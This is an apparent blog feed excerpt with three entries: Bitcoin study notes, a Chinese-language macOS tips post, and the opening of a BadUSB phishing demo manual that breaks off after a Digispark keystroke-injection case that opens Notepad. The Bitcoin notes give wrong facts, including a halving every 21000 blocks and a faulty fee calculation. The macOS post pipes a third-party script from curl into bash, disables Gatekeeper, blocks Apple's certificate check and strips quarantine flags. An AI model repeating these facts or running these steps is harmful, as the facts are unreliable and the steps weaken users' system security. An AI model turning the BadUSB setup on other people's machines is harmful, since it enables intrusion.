Chain Rule"></a>Longest Valid Chain Rule</h2><p>The blockchain tends to let the longest chain be the main chain.<br>If this situation happens(like the image below): A transfers $5 to B, then A transfers the same money to the fake A(A’), it may lead to the <strong>[[Forking Attack]]</strong>, but if there is another transaction after the A to B Tx, according to the longest chain rule, the attack couldn’t happen.<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20220817034935.png"></p><p>However, If two valid blocks make the chain forked, then the blockchain would choose the smaller delay one as the main chain.</p><p>And the other block will be orphaned, called the <strong>Orphan block</strong>.<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20220817041314.png"></p><ul><li>[[Selfish Mining]] is also follow the Longest Valid Chain Rule.</li></ul><h1 id="Achieve"><a href="#Achieve" class="headerlink" title="Achieve"></a>Achieve</h1><p>This is a piece of classic block information:<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20220819015133.png"></p><h2 id="UTXO"><a href="#UTXO" class="headerlink" title="UTXO"></a>UTXO</h2><ul><li>A full node also can do the [[UTXO]](Unspent Transaction Output) stuff.</li></ul><h2 id="Mining-Theory"><a href="#Mining-Theory" class="headerlink" title="Mining Theory"></a>Mining Theory</h2><ul><li>The Bitcoin system is always waiting for 6 confirmations to confirm a transaction(6 transactions before) is irrevocable.<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20220819044541.png"></li></ul><p>Miner will get the reward by mining(package the block, solve the difficulty), the reward contains two parts:</p><h3 id="Block-Reward"><a href="#Block-Reward" class="headerlink" title="Block Reward"></a>Block Reward</h3><ul><li>Bitcoin is secured by mining, mining is better than voting by the membership.<br>The Bitcoin system regulates that Every 21000 blocks the block rewards be decreased by half.<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20220819033516.png"></li></ul><p>On average, the Bitcoin system will create a block per 10 minutes, which means 21000 blocks will cost 4 years, which means every 4 years the Block Reward will be decreased by half.</p><blockquote><p>Although the Block Reward is decreasing, the value of Bitcoin itself increasing year by year. So the motivation for mining is also sufficient.</p></blockquote><p>The Bitcoin system always adjusts the target difficulty to make the average Block time to be 10 minutes every block.</p><blockquote><p>Gradually, the trend will become a <strong>Geometric Series</strong>, and the total BTC is stable: <strong>21000000 BTC</strong><br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20220819035335.png">It means that there is half of BTC at least has been mined in past. </p></blockquote><h3 id="Transaction-Fee"><a href="#Transaction-Fee" class="headerlink" title="Transaction Fee"></a>Transaction Fee</h3><p>Each transaction always satisfies this relation:<br>$$Total\ Inputs \geq Total\ Outputs$$<br>For example, if A wants to transfer 1 BTC to B and B can only receive 0.99 BTC, The 0.1 BTC is the Transaction Fee to pay for the miner.</p><h2 id="Mining-Distribution"><a href="#Mining-Distribution" class="headerlink" title="Mining Distribution"></a>Mining Distribution</h2><ul><li>Every mining action can seem like a [[Bernoulli Trail]], these Bernoulli Trail constitute the Bernoulli Process(A sequence of independent Bernoulli trials)<br>The Bernoulli Trail’s <strong>memoryless</strong> feature guarantees the blockchain’s fairness, imagine that a node has the 10 times calculating power of another one, if the system is memorable, the advantage of the high power node will expand unlimitedly, then the weak one has no chance to defeat it ever.</li><li>Because mining blocks is a low probably process, all the mining actions can seem like a [[Poisson Distribution]].</li><li>From a global perspective, every block time of a blockchain is an [[Exponential Distribution]].<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20220819033714.png"></li><li>If the past behavior will not affect to the future’s, it called <strong>Progress Free</strong></li></ul><h2 id="Guarantee-the-Blockchain-difficulty-demand"><a href="#Guarantee-the-Blockchain-difficulty-demand" class="headerlink" title="Guarantee the Blockchain difficulty demand"></a>Guarantee the Blockchain difficulty demand</h2><p>Because these years, too many miners mining the block to guarantee the Blockchain difficulty demand, causing the nonce is a <code>32bits non-symbolic integer</code>, so we could adjust the <strong>Merkle root hash</strong> and <strong>time</strong>(cause the transaction no need to record a specific time) to increase the difficulty.<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20220819022534.png"></p><h2 id="Legality-of-transaction"><a href="#Legality-of-transaction" class="headerlink" title="Legality of transaction"></a>Legality of transaction</h2><p>Every transaction has <strong>Input scripts</strong> and <strong>Output scripts</strong>. When the previous transaction’s Output Scripts stitch with the current transaction’s Input Scripts, and the scripts successfully run, which means the current transaction is legal.</p><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20220819023220.png"></p><h1 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h1><p>The Bitcoin system is based on the application layer in the network, and it uses <strong>P2P(Peer to Peer) Overlay Network</strong> in its network layer.</p><blockquote><p>Bitcoin’s network is simple, and robust, but not efficient.</p></blockquote><ul><li><p>When a node receives a message, it will “flood” to other neighbor nodes. (The neighbor is a logical concept, not a real geographic neighbor)</p></li><li><p>The Bitcoin network follows the <strong>Best-effect Delivery</strong> standard.</p></li><li><p>When a transaction wants to get into Blockchain, it will be joined into an aggregate by a node.<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20220820055006.png"></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/Bitcoin-Paper.jpeg&quot; alt=&quot;Bitcoin-Paper.jpeg&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Technical-terms&quot;&gt;&lt;a href=&quot;#Technical-terms&quot; class=&quot;headerlink&quot; title=&quot;Technical terms&quot;&gt;&lt;/a&gt;Technical terms&lt;/h1&gt;</summary>
    
    
    
    <category term="TechLearning" scheme="https://resek4.github.io/categories/TechLearning/"/>
    
    
  </entry>
  
  <entry>
    <title>MacOS Custom Settings</title>
    <link href="https://resek4.github.io/2022/08/04/MacOS%20Custom%20Settings/"/>
    <id>https://resek4.github.io/2022/08/04/MacOS%20Custom%20Settings/</id>
    <published>2022-08-03T16:00:00.000Z</published>
    <updated>2023-01-27T09:31:57.127Z</updated>
    
    <content type="html"><![CDATA[<h2 id="命令行看星战"><a href="#命令行看星战" class="headerlink" title="命令行看星战"></a>命令行看星战</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet towel.blinkenlights.nl</span><br></pre></td></tr></table></figure><h1 id="Homebrew"><a href="#Homebrew" class="headerlink" title="Homebrew"></a>Homebrew</h1><p>三条命令安装 Homebrew</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;eval &quot;$(/opt/homebrew/bin/brew shellenv)&quot;&#x27;</span> &gt;&gt; ~/.zprofile</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(/opt/homebrew/bin/brew shellenv)</span>&quot;</span></span><br></pre></td></tr></table></figure><span id="more"></span><h1 id="git"><a href="#git" class="headerlink" title="git"></a>git</h1><p>当远程有 git 的时候<br>本地只需要</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;邮箱&quot;</span></span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>即可在本地生成一个 <code>.ssh</code> 密钥文件，将 <code>id_rsa.pub</code> 里的内容复制到 github 上的个人设置里就行了</p><h1 id="PD"><a href="#PD" class="headerlink" title="PD"></a>PD</h1><p>去这个链接去安装 pd<br><a href="https://www.parallels.com/hk/products/desktop/welcome-trial/">https://www.parallels.com/hk/products/desktop/welcome-trial/</a><br>去这个链接去安装 pd runner<br><a href="https://macwk.com/soft/pd-runner">https://macwk.com/soft/pd-runner</a></p><p>正常安装一个 pd 上的 win11，然后当打开这个系统的时候，pd 会提示让你注册<br>你正常注册，然后会进入试用期</p><p>运行 pd runner，以后用 pd runner 启动 win11 就好了</p><h1 id="office"><a href="#office" class="headerlink" title="office"></a>office</h1><p>去百度云网盘里边去装 mac 的 office<br>“mac 版 Office2019_兼容 M1 芯片”</p><h1 id="签名验证导致-dock-栏跳（软件启动慢）"><a href="#签名验证导致-dock-栏跳（软件启动慢）" class="headerlink" title="签名验证导致 dock 栏跳（软件启动慢）"></a>签名验证导致 dock 栏跳（软件启动慢）</h1><p>去 <code>/etc/hosts</code> 里更改 hosts，加上一条以避免验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 ocsp.apple.com</span><br></pre></td></tr></table></figure><h1 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h1><h2 id="显示隐藏文件"><a href="#显示隐藏文件" class="headerlink" title="显示隐藏文件"></a>显示隐藏文件</h2><p><code>Command</code>+<code>Shift</code>+<code>.</code></p><h2 id="截图及录屏"><a href="#截图及录屏" class="headerlink" title="截图及录屏"></a>截图及录屏</h2><p><code>Command</code>+<code>Shift</code>+<code>4</code>&#x2F;<code>5</code></p><h1 id="预览-Preview-app"><a href="#预览-Preview-app" class="headerlink" title="预览 Preview.app"></a>预览 Preview.app</h1><h2 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h2><p>在预览中可以进行裁剪，绘画，签名，移动至其他设备等</p><h2 id="在预览中查看格式化-manual-page-信息"><a href="#在预览中查看格式化-manual-page-信息" class="headerlink" title="在预览中查看格式化 manual page 信息"></a>在预览中查看格式化 manual page 信息</h2><p>在环境变量上加上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.zshrc中</span><br><span class="line">pdfman=<span class="string">&#x27;func()&#123;man -t $1|open -fa Preview.app&#125;;func&#x27;</span></span><br></pre></td></tr></table></figure><p>之后便可以使用 <code>pdfman ls</code> 来用预览来展示 ls 的详细信息了</p><h1 id="Option-的作用"><a href="#Option-的作用" class="headerlink" title="Option 的作用"></a>Option 的作用</h1><h2 id="查看各种硬件的详细信息"><a href="#查看各种硬件的详细信息" class="headerlink" title="查看各种硬件的详细信息"></a>查看各种硬件的详细信息</h2><p>使用 <code>Option</code>+<code>左键单击</code>wifi，蓝牙，可以展示其硬件详细信息</p><h2 id="移动文件"><a href="#移动文件" class="headerlink" title="移动文件"></a>移动文件</h2><p>除了 <code>Ctrl</code>+<code>c</code> 后 <code>Ctrl</code>+<code>Alt</code>+<code>v</code> 来游动文件<br>还可以在复制后，在目标文件夹下，使用 <code>Option</code>+<code>右键单击</code> 来移动文件</p><h2 id="同时开多窗口打开文件夹"><a href="#同时开多窗口打开文件夹" class="headerlink" title="同时开多窗口打开文件夹"></a>同时开多窗口打开文件夹</h2><p>在同一个文件夹下，多选多个文件夹，然后 <code>Option</code>+<code>右键单击</code>，点击打开多个窗口即可</p><h2 id="1-x2F-4-格音量、亮度调整"><a href="#1-x2F-4-格音量、亮度调整" class="headerlink" title="1&#x2F;4 格音量、亮度调整"></a>1&#x2F;4 格音量、亮度调整</h2><p>按住 <code>Shift</code>+<code>Option</code>+<code>音量调整</code>&#x2F;<code>亮度调整</code> 可以 1&#x2F;4 格的调整音量</p><h2 id="多模式缩放窗口"><a href="#多模式缩放窗口" class="headerlink" title="多模式缩放窗口"></a>多模式缩放窗口</h2><p>按住 <code>Option</code> 然后将鼠标移动到绿色的缩放按钮上，即可展示不同模式的缩放选择</p><h2 id="程序坞上"><a href="#程序坞上" class="headerlink" title="程序坞上"></a>程序坞上</h2><p>在程序坞上面 <code>Option</code>+<code>右键单击</code> 即可</p><ul><li>隐藏其他应用</li><li>强制退出应用</li></ul><h2 id="在打开多任务-Dock-的时候"><a href="#在打开多任务-Dock-的时候" class="headerlink" title="在打开多任务 Dock 的时候"></a>在打开多任务 Dock 的时候</h2><p>可以直接按住 <code>Option</code> 来点掉多个桌面的 <code>X</code>，不用来回晃动了</p><h1 id="使用-jenv-快速进行-linux-多版本-java-配置"><a href="#使用-jenv-快速进行-linux-多版本-java-配置" class="headerlink" title="使用 jenv 快速进行 linux 多版本 java 配置"></a>使用 jenv 快速进行 linux 多版本 java 配置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前安装jdk路径</span></span><br><span class="line">/usr/libexec/java_home -V</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装jenv</span></span><br><span class="line">brew install jenv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在环境变量里边添加上：</span></span><br><span class="line"><span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(jenv init -)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加不同jdk版本到jenv路径</span></span><br><span class="line">jenv add /Library/Java/JavaVirtualMachines/jdk-17.0.2.jdk/Contents/Home</span><br><span class="line">jenv add /Library/Java/JavaVirtualMachines/jdk-15.0.2.jdk/Contents/Home</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前已配置到jenv的jdk版本</span></span><br><span class="line">jenv versions</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换jdk版本，例如切换到jdk15</span></span><br><span class="line">jenv <span class="built_in">local</span> 15 </span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="双击一个文件使用-Vim-打开"><a href="#双击一个文件使用-Vim-打开" class="headerlink" title="双击一个文件使用 Vim 打开"></a>双击一个文件使用 Vim 打开</h1><h2 id="使用热键窗口打开"><a href="#使用热键窗口打开" class="headerlink" title="使用热键窗口打开"></a>使用热键窗口打开</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">on run &#123;input, parameters&#125;</span><br><span class="line">tell application &quot;iTerm&quot;</span><br><span class="line">tell current window</span><br><span class="line">create tab with profile &quot;HK&quot;</span><br><span class="line">tell current session</span><br><span class="line">write text (&quot;nvim &quot; &amp; quote &amp; POSIX path of input &amp; quote &amp; &quot;; exit&quot;)</span><br><span class="line">end tell</span><br><span class="line">end tell</span><br><span class="line">display notification &quot;🎉&quot; &amp; quote &amp; POSIX path of input &amp; quote &amp; &quot; has been opened at the iTerm Hotkey window~&quot;</span><br><span class="line">end tell</span><br><span class="line">end run</span><br></pre></td></tr></table></figure><h2 id="使用窗口打开"><a href="#使用窗口打开" class="headerlink" title="使用窗口打开"></a>使用窗口打开</h2><p>使用 Automator 创建一个 AppleScript ，然后写入如下命令，以后所有想要用 Vim 打开的文件全部使用这个 Application 打开就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">on run &#123;input, parameters&#125;</span><br><span class="line">    tell application &quot;iTerm&quot;</span><br><span class="line">        create window with default profile</span><br><span class="line">        tell front window</span><br><span class="line">            tell current session</span><br><span class="line">                write text (&quot;nvim &quot; &amp; quote &amp; POSIX path of input &amp; quote &amp; &quot;; exit&quot;)</span><br><span class="line">            end tell</span><br><span class="line">        end tell</span><br><span class="line">    end tell</span><br><span class="line">end run</span><br></pre></td></tr></table></figure><blockquote><p>不传输路径</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">on run &#123;&#125;</span><br><span class="line">    tell application <span class="string">&quot;iTerm&quot;</span></span><br><span class="line">        create window with default profile</span><br><span class="line">        tell front window</span><br><span class="line">            tell current session</span><br><span class="line">                write text (<span class="string">&quot;nvim &quot;</span> &amp; <span class="string">&quot;; exit&quot;</span>)</span><br><span class="line">            end tell</span><br><span class="line">        end tell</span><br><span class="line">    end tell</span><br><span class="line">end run</span><br></pre></td></tr></table></figure><h1 id="当应用不能安装的时候"><a href="#当应用不能安装的时候" class="headerlink" title="当应用不能安装的时候"></a>当应用不能安装的时候</h1><h2 id="开启任意来源"><a href="#开启任意来源" class="headerlink" title="开启任意来源"></a>开启任意来源</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开启任意来源</span><br><span class="line">sudo spctl --master-disable </span><br><span class="line">关闭任意来源</span><br><span class="line">sudo spctl --master-enable </span><br></pre></td></tr></table></figure><h2 id="当应用程序显示损坏的时候"><a href="#当应用程序显示损坏的时候" class="headerlink" title="当应用程序显示损坏的时候"></a>当应用程序显示损坏的时候</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo xattr -r -d com.apple.quarantine /Applications/YesPlayMusic.app</span><br><span class="line">后方的应用程序所在路径</span><br></pre></td></tr></table></figure><h1 id="开启命令行-sudo-使用指纹解锁"><a href="#开启命令行-sudo-使用指纹解锁" class="headerlink" title="开启命令行 sudo 使用指纹解锁"></a>开启命令行 sudo 使用指纹解锁</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Edit the /etc/pam.d/sudo</span></span><br><span class="line">sudo vim /etc/pam.d/sudo</span><br><span class="line"></span><br><span class="line"><span class="comment"># Append the below line to this file(It&#x27;s best to put is to the top)</span></span><br><span class="line">auth sufficient pam_tid.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use :wq! to force save and quit</span></span><br><span class="line">:wq!</span><br></pre></td></tr></table></figure><blockquote><p>If you want to <strong>unlock this with your Apple Watch</strong>, then go to the mac preferences to modify the setting.</p></blockquote><h1 id="使用-Ctrl-Command-进行窗口拖动"><a href="#使用-Ctrl-Command-进行窗口拖动" class="headerlink" title="使用 Ctrl+Command 进行窗口拖动"></a>使用 Ctrl+Command 进行窗口拖动</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># enable</span></span><br><span class="line">defaults write -g NSWindowShouldDragOnGesture -bool <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># disable</span></span><br><span class="line">defaults delete -g NSWindowShouldDragOnGesture</span><br></pre></td></tr></table></figure><p> <a href="https://raw.githubusercontent.com/first20hours/google-10000-english/master/google-10000-english-no-swears.txt">https://raw.githubusercontent.com/first20hours/google-10000-english/master/google-10000-english-no-swears.txt</a></p><h1 id="使-Mac-上地图变成中文的（系统英文的情况下）"><a href="#使-Mac-上地图变成中文的（系统英文的情况下）" class="headerlink" title="使 Mac 上地图变成中文的（系统英文的情况下）"></a>使 Mac 上地图变成中文的（系统英文的情况下）</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.Maps AppleLanguages <span class="string">&#x27;(zh-CN)&#x27;</span></span><br><span class="line"><span class="comment"># 同样，我们看可以使用如下命令来进行键值的读取</span></span><br><span class="line"><span class="comment"># defaults read com.apple.Maps AppleLanguages</span></span><br></pre></td></tr></table></figure><p>更改的位置即为如下路径中的 <code>AppleLanguages</code> 键值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Users/resek4/Library/Containers/com.apple.Maps/Data/Library/Preferences/com.apple.Maps.plist</span><br></pre></td></tr></table></figure><blockquote><p>更多 Mac 下 defaults 用法详见：<br><a href="https://zhuanlan.zhihu.com/p/393397480">重置 macOS 程序坞以及 defaults 命令用法 - 知乎</a><br><a href="https://macos-defaults.com/menubar/">Menu Bar | macOS defaults</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;命令行看星战&quot;&gt;&lt;a href=&quot;#命令行看星战&quot; class=&quot;headerlink&quot; title=&quot;命令行看星战&quot;&gt;&lt;/a&gt;命令行看星战&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;telnet towel.blinkenlights.nl&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&quot;Homebrew&quot;&gt;&lt;a href=&quot;#Homebrew&quot; class=&quot;headerlink&quot; title=&quot;Homebrew&quot;&gt;&lt;/a&gt;Homebrew&lt;/h1&gt;&lt;p&gt;三条命令安装 Homebrew&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;/bin/bash -c &lt;span class=&quot;string&quot;&gt;&amp;quot;&lt;span class=&quot;subst&quot;&gt;$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/install.sh)&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;eval &amp;quot;$(/opt/homebrew/bin/brew shellenv)&amp;quot;&amp;#x27;&lt;/span&gt; &amp;gt;&amp;gt; ~/.zprofile&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;eval&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;&lt;span class=&quot;subst&quot;&gt;$(/opt/homebrew/bin/brew shellenv)&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="HackStyle" scheme="https://resek4.github.io/categories/HackStyle/"/>
    
    
  </entry>
  
  <entry>
    <title>Four Phishing Scenes Demo Manual</title>
    <link href="https://resek4.github.io/2022/07/15/Four%20Phishing%20Scenes%20Demo%20Manual/"/>
    <id>https://resek4.github.io/2022/07/15/Four%20Phishing%20Scenes%20Demo%20Manual/</id>
    <published>2022-07-15T14:40:00.000Z</published>
    <updated>2023-03-22T17:16:19.299Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BadUSB-Phishing-CS-released"><a href="#BadUSB-Phishing-CS-released" class="headerlink" title="BadUSB Phishing CS released"></a>BadUSB Phishing CS released</h1><p>Use the tool <strong>Digispark</strong>, shaped like a USB memory stick, and use the Arduino compilation to burn programs into it.</p><h2 id="Install-Arduino-debugging-software"><a href="#Install-Arduino-debugging-software" class="headerlink" title="Install Arduino debugging software"></a>Install Arduino debugging software</h2><ol><li>Open the Arduino website <a href="https://www.arduino.cc/">Arduino - Home</a> and click Software.</li></ol><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322224449.png" alt="image.png"></p><span id="more"></span><ol start="2"><li>Download the Windows version of the software (the one that says Win7 or newer on the right) to install</li></ol><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322224528.png" alt="image.png"><br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322224628.png" alt="image.png"></p><ol start="3"><li>Install the software, which will prompt you to install a USB drive, click Install</li></ol><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322224649.png" alt="image.png"></p><ol start="4"><li>The installation is successful as shown in the following figure<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322224707.png" alt="image.png"></li></ol><h2 id="Configuring-Digispark-in-the-Arduino-board"><a href="#Configuring-Digispark-in-the-Arduino-board" class="headerlink" title="Configuring Digispark in the Arduino board"></a>Configuring Digispark in the Arduino board</h2><ol><li>In <code>Additional Board Manager URLs</code>, add:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://raw.githubusercontent.com/ArminJo/DigistumpArduino/master/package_digistump_index.json</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322224806.png" alt="image.png"></p><ol start="2"><li><p>Click <code>Development Edition Management</code>, and search for <strong>digistump</strong> , you can find this development version configuration information, install this <code>Digistump AVR Boards</code><br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322224820.png" alt="image.png"><br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322224830.png" alt="image.png"></p></li><li><p>Click <code>Development Boards</code> - &gt; <code>Digistump AVR Boards</code> - &gt; <code>Digispark (Default - 16.5mhz) </code></p></li></ol><h2 id="Upload-program"><a href="#Upload-program" class="headerlink" title="Upload program"></a>Upload program</h2><ul><li>Upload the program you want to execute, enter the code you want to upload, and click the right arrow to upload (the one on the left is verification, uploading includes the steps of verification)</li></ul><p>When uploading, it will let you save the program in one place, save it in one place at will.<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322224857.png" alt="image.png"><br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322224902.png" alt="image.png"></p><h3 id="Case-1-Pop-up-Notepad"><a href="#Case-1-Pop-up-Notepad" class="headerlink" title="Case 1: Pop-up Notepad"></a>Case 1: Pop-up Notepad</h3><p>If you want to pop-up notepad, burn the following program:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;DigiKeyboard.h&quot;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">  DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);</span><br><span class="line">  delay(<span class="number">500</span>);</span><br><span class="line">  DigiKeyboard.println(<span class="string">&quot;notepad&quot;</span>);</span><br><span class="line">  delay(<span class="number">500</span>);</span><br><span class="line">  DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322224930.png" alt="image.png"></p><h3 